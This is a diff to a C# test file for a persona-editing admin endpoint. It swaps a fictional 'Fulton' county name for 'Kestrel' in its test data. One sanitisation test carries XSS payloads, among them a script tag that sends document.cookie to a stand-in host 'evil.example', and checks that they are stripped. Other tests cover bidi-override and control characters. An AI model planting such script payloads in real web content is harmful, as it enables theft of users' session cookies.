@@ -49,9 +49,9 @@ public sealed class PersonaAdminEndpointTests
 
         var response = await PatchAsync(client, personaId, new
         {
-            displayName = "Fulton County EM",
-            bio = "Official updates from Fulton County Emergency Management.",
-            location = "Fulton, OH",
+            displayName = "Kestrel County EM",
+            bio = "Official updates from Kestrel County Emergency Management.",
+            location = "Kestrel, OH",
             verified = false,
             avatarMediaId = avatar.ToString(),
             bannerMediaId = banner.ToString(),
@@ -60,10 +60,10 @@ public sealed class PersonaAdminEndpointTests
         response.StatusCode.Should().Be(HttpStatusCode.OK);
         var body = await ReadObjectAsync(response);
         body.GetProperty("id").GetString().Should().Be(personaId.ToString());
-        body.GetProperty("displayName").GetString().Should().Be("Fulton County EM");
-        body.GetProperty("initials").GetString().Should().Be("FC", "derived from the NEW display name");
-        body.GetProperty("bio").GetString().Should().Be("Official updates from Fulton County Emergency Management.");
-        body.GetProperty("location").GetString().Should().Be("Fulton, OH");
+        body.GetProperty("displayName").GetString().Should().Be("Kestrel County EM");
+        body.GetProperty("initials").GetString().Should().Be("KC", "derived from the NEW display name");
+        body.GetProperty("bio").GetString().Should().Be("Official updates from Kestrel County Emergency Management.");
+        body.GetProperty("location").GetString().Should().Be("Kestrel, OH");
         body.GetProperty("verified").GetBoolean().Should().BeFalse();
         body.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar), "the read-back is signed (BP's GetStaffPersonaAsync)");
         body.GetProperty("bannerUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(banner));
@@ -74,9 +74,9 @@ public sealed class PersonaAdminEndpointTests
         PropertyNames(body).Should().NotContain("castable").And.NotContain("avatarMediaId").And.NotContain("bannerMediaId");
 
         var after = await _seed.ReadPersonaAsync(personaId);
-        after.DisplayName.Should().Be("Fulton County EM");
-        after.Bio.Should().Be("Official updates from Fulton County Emergency Management.");
-        after.Location.Should().Be("Fulton, OH");
+        after.DisplayName.Should().Be("Kestrel County EM");
+        after.Bio.Should().Be("Official updates from Kestrel County Emergency Management.");
+        after.Location.Should().Be("Kestrel, OH");
         after.Verified.Should().BeFalse();
         after.AvatarMediaId.Should().Be(avatar);
         after.BannerMediaId.Should().Be(banner);
@@ -242,16 +242,16 @@ public sealed class PersonaAdminEndpointTests
 
         var response = await PatchAsync(client, personaId, new
         {
-            displayName = "<b>Fulton</b> County EM",
-            bio = "<script>fetch('https://evil.example/'+document.cookie)</script>Shelter at Fulton High. <img src=x onerror=alert(1)>",
-            location = "<a href=\"javascript:alert(1)\">Fulton</a>, OH",
+            displayName = "<b>Kestrel</b> County EM",
+            bio = "<script>fetch('https://evil.example/'+document.cookie)</script>Shelter at Kestrel High. <img src=x onerror=alert(1)>",
+            location = "<a href=\"javascript:alert(1)\">Kestrel</a>, OH",
         });
 
         response.StatusCode.Should().Be(HttpStatusCode.OK);
         var after = await _seed.ReadPersonaAsync(personaId);
-        after.DisplayName.Should().Be("Fulton County EM");
-        after.Bio.Should().Be("Shelter at Fulton High.", "NFR-004: stripped (never encoded), so a stored script can execute nowhere");
-        after.Location.Should().Be("Fulton, OH");
+        after.DisplayName.Should().Be("Kestrel County EM");
+        after.Bio.Should().Be("Shelter at Kestrel High.", "NFR-004: stripped (never encoded), so a stored script can execute nowhere");
+        after.Location.Should().Be("Kestrel, OH");
 
         var raw = await response.Content.ReadAsStringAsync();
         raw.Should().NotContain("script").And.NotContain("onerror").And.NotContain("javascript:");
@@ -356,9 +356,9 @@ public sealed class PersonaAdminEndpointTests
 
         var response = await PatchAsync(staffClient, personaId, new
         {
-            displayName = "Fulton County EM",
+            displayName = "Kestrel County EM",
             bio = "Official updates.",
-            location = "Fulton, OH",
+            location = "Kestrel, OH",
             verified = false,
             avatarMediaId = avatar.ToString(),
             bannerMediaId = banner.ToString(),
@@ -366,9 +366,9 @@ public sealed class PersonaAdminEndpointTests
         response.StatusCode.Should().Be(HttpStatusCode.OK);
 
         var seenByParticipant = (await ReadPersonaFromListAsync(participantClient, personaId))!.Value;
-        seenByParticipant.GetProperty("displayName").GetString().Should().Be("Fulton County EM");
+        seenByParticipant.GetProperty("displayName").GetString().Should().Be("Kestrel County EM");
         seenByParticipant.GetProperty("bio").GetString().Should().Be("Official updates.");
-        seenByParticipant.GetProperty("location").GetString().Should().Be("Fulton, OH");
+        seenByParticipant.GetProperty("location").GetString().Should().Be("Kestrel, OH");
         seenByParticipant.GetProperty("verified").GetBoolean().Should().BeFalse("the trust mark participants see follows the edit");
         seenByParticipant.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar));
         seenByParticipant.GetProperty("bannerUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(banner));
@@ -376,7 +376,7 @@ public sealed class PersonaAdminEndpointTests
             .And.NotContain("castable");
 
         var seenByStaff = (await ReadPersonaFromListAsync(staffClient, personaId))!.Value;
-        seenByStaff.GetProperty("displayName").GetString().Should().Be("Fulton County EM");
+        seenByStaff.GetProperty("displayName").GetString().Should().Be("Kestrel County EM");
         seenByStaff.GetProperty("avatarUrl").GetString().Should().Be(FakeMediaUrlSigner.UrlFor(avatar));
         seenByStaff.GetProperty("personaType").GetString().Should().Be("agency");
         PropertyNames(seenByStaff).Should().NotContain("castable");
@@ -429,17 +429,17 @@ public sealed class PersonaAdminEndpointTests
         await using var factory = _seed.CreateFactory();
         using var client = factory.CreateClientFor(exercise.Host, controller);
 
-        var response = await PatchAsync(client, personaId, new { location = "Fulton, OH" });
+        var response = await PatchAsync(client, personaId, new { location = "Kestrel, OH" });
 
         response.StatusCode.Should().Be(HttpStatusCode.OK);
-        (await _seed.ReadPersonaAsync(personaId)).Location.Should().Be("Fulton, OH");
+        (await _seed.ReadPersonaAsync(personaId)).Location.Should().Be("Kestrel, OH");
     }
 
     [RequiresDockerFact]
     public async Task HandleUniqueness_IsUntouched_AnotherPersonasHandleIsRefused_AndTheIndexStillHolds()
     {
         var exercise = await _seed.SeedExerciseAsync();
-        var taken = $"FulcoEM_{Guid.NewGuid():N}"[..20];
+        var taken = $"KestrelCoEM_{Guid.NewGuid():N}"[..24];
         var owner = await _seed.SeedPersonaAsync(exercise.Id, handle: taken);
         var personaId = await _seed.SeedPersonaAsync(exercise.Id);
         var before = await _seed.ReadPersonaAsync(personaId);
@@ -519,10 +519,10 @@ public sealed class PersonaAdminEndpointTests
         await using var factory = _seed.CreateFactory();
         using var client = factory.CreateClientFor(exercise.Host, controller);
 
-        var response = await PatchBytesAsync(client, personaId, Encoding.UTF8.GetBytes("""{ "location": "Fulton, OH" }"""), contentType);
+        var response = await PatchBytesAsync(client, personaId, Encoding.UTF8.GetBytes("""{ "location": "Kestrel, OH" }"""), contentType);
 
         response.StatusCode.Should().Be(HttpStatusCode.OK);
-        (await _seed.ReadPersonaAsync(personaId)).Location.Should().Be("Fulton, OH");
+        (await _seed.ReadPersonaAsync(personaId)).Location.Should().Be("Kestrel, OH");
     }
 
     [RequiresDockerTheory]
@@ -566,12 +566,12 @@ public sealed class PersonaAdminEndpointTests
     }
 
     [RequiresDockerTheory]
-    [InlineData("displayName", "Fulco‮ME", PersonaAdminMessages.DisplayNameForbiddenCharacter)]
-    [InlineData("displayName", "Ful\u0000co", PersonaAdminMessages.DisplayNameForbiddenCharacter)]
+    [InlineData("displayName", "KestrelCo‮ME", PersonaAdminMessages.DisplayNameForbiddenCharacter)]
+    [InlineData("displayName", "Kes\u0000trel", PersonaAdminMessages.DisplayNameForbiddenCharacter)]
     [InlineData("bio", "Official ⁦updates⁩", PersonaAdminMessages.BioForbiddenCharacter)]
     [InlineData("bio", "Bell\u0007", PersonaAdminMessages.BioForbiddenCharacter)]
-    [InlineData("location", "Fulton\u0000, OH", PersonaAdminMessages.LocationForbiddenCharacter)]
-    [InlineData("location", "‫Fulton", PersonaAdminMessages.LocationForbiddenCharacter)]
+    [InlineData("location", "Kestrel\u0000, OH", PersonaAdminMessages.LocationForbiddenCharacter)]
+    [InlineData("location", "‫Kestrel", PersonaAdminMessages.LocationForbiddenCharacter)]
     public async Task ControlOrBidiOverrideCharacter_Returns400_AndChangesNothing(string field, string value, string expected)
     {
         // Gate-1 S-2: NUL and U+202E (and friends) are never stored.
@@ -589,7 +589,7 @@ public sealed class PersonaAdminEndpointTests
         await using var factory = _seed.CreateFactory();
         using var client = factory.CreateClientFor(exercise.Host, controller);
 
-        const string lookalike = "Fulcо ЕM";
+        const string lookalike = "KestrelCо ЕM";
         const string bio = "Not the county.\nJust here to help.";
         var response = await PatchAsync(client, personaId, new { displayName = lookalike, bio });
 
